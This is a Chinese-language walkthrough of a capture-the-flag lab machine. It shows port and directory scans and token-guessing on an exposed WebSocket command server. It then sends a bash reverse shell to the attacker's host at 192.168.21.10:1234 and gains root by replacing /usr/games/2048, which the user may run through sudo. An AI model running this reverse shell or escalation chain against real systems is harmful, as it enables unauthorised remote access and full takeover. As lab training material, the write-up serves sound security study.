# 信息搜集

端口扫描

```

┌──(kali㉿kali)-[~]

└─$ nmap -A -p- 192.168.21.8

Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-12 01:18 EDT

Nmap scan report for 192.168.21.8

Host is up (0.00026s latency).

Not shown: 65532 closed tcp ports (reset)

PORT     STATE SERVICE         VERSION

22/tcp   open  ssh             OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)

| ssh-hostkey:

|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)

|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)

|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)

80/tcp   open  http            Apache httpd 2.4.62 ((Debian))

|_http-title: Site doesn't have a title (text/html).

|_http-server-header: Apache/2.4.62 (Debian)

8765/tcp open  ultraseek-http?

MAC Address: 08:00:27:88:D9:F4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Device type: general purpose|router

Running: Linux 4.X|5.X, MikroTik RouterOS 7.X

OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3

OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)

Network Distance: 1 hop

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  

TRACEROUTE

HOP RTT     ADDRESS

1   0.26 ms 192.168.21.8

  

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 91.05 seconds

```

# 漏洞利用

看一下80端口

```

┌──(kali㉿kali)-[~]

└─$ curl http://192.168.21.8/

index

```

目录扫描,没东西

```

┌──(kali㉿kali)-[~]

└─$ gobuster dir -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u http://192.168.21.8/

===============================================================

Gobuster v3.6

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

===============================================================

[+] Url:                     http://192.168.21.8/

[+] Method:                  GET

[+] Threads:                 10

[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt

[+] Negative Status codes:   404

[+] User Agent:              gobuster/3.6

[+] Timeout:                 10s

===============================================================

Starting gobuster in directory enumeration mode

===============================================================

/server-status        (Status: 403) [Size: 277]

Progress: 1185254 / 1185255 (100.00%)

===============================================================

Finished

===============================================================

```

看一下8765端口

```

┌──(kali㉿kali)-[~]

└─$ curl http://192.168.21.8:8765

Failed to open a WebSocket connection: missing Connection header.

  

You cannot access a WebSocket server directly with a browser. You need a WebSocket client.

```

使用wscat

```

┌──(kali㉿kali)-[~]

└─$ wscat -c ws://192.168.21.8:8765

Connected (press CTRL+C to quit)

< {"type": "system", "message": "Connected to command server. Send commands use JSON"}                                                      

> {"type": "command", "command": "help"}

< {"type": "error", "message": "Invalid token. Access denied."}

```

尝试token为admin、secret、1234，还真是啊

```

> {"type": "command", "command": "whoami", "token": "admin"}

< {"type": "result", "command": "whoami", "output": "caidao\n"}

```

反弹shell

```

> {"type":"command","command":"/bin/bash -c 'bash -i >& /dev/tcp/192.168.21.10/1234 0>&1'", "token":"admin"}

┌──(kali㉿kali)-[~]

└─$ nc -lvnp 1234

listening on [any] 1234 ...

connect to [192.168.21.10] from (UNKNOWN) [192.168.21.8] 42606

bash: cannot set terminal process group (392): Inappropriate ioctl for device

bash: no job control in this shell

caidao@Wushu:/root$ id

id

uid=1000(caidao) gid=1000(caidao) groups=1000(caidao)

```

# 权限提升

寻找可能提权的地方

```

caidao@Wushu:~$ sudo -l

sudo -l

Matching Defaults entries for caidao on Wushu:

    env_reset, mail_badpass,

    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

  

User caidao may run the following commands on Wushu:

    (ALL : ALL) NOPASSWD: /usr/bin/2048

```

/usr/bin/2048指向/usr/games/2048，caidao对/usr拥有权限，虽然/usr/games的权限和/usr/games/2048是root所拥有，但是我们可以重命名/usr/games，在伪造一个新的games/2048来执行

```

caidao@Wushu:~$ ls -la /usr/bin/2048

ls -la /usr/bin/2048

lrwxrwxrwx 1 root root 15 Aug 18 09:58 /usr/bin/2048 -> /usr/games/2048

caidao@Wushu:~$ ls -la /

ls -la /

drwxr-xr-x  14 caidao caidao  4096 Sep 12 03:22 usr

caidao@Wushu:/usr$ mv /usr/games /usr/1

mv /usr/games /usr/1

caidao@Wushu:~$ mkdir /usr/games

mkdir /usr/games

caidao@Wushu:~$ echo -e '#!/bin/bash\n/bin/bash' > /usr/games/2048

echo -e '#!/bin/bash\n/bin/bash' > /usr/games/2048

caidao@Wushu:~$ chmod +x /usr/games/2048

chmod +x /usr/games/2048

caidao@Wushu:~$ sudo /usr/bin/2048

sudo /usr/bin/2048

id

uid=0(root) gid=0(root) groups=0(root)

```
